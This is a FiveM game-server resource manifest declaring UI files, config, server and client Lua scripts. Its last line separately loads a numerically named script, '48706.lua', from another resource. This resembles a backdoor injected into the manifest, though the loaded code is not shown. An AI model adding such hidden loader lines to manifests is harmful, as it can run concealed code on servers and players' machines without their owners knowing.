fx_version 'cerulean'
game 'gta5'
 
ui_page 'html/index.html'

file {
	'html/*.html',
	'html/*.css',
	'html/*.js'
}

shared_scripts {
	'config/*.lua',
}

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'server/*.lua'
}
client_scripts {
	'client/*.lua'
}
client_script '@esx_atm/48706.lua'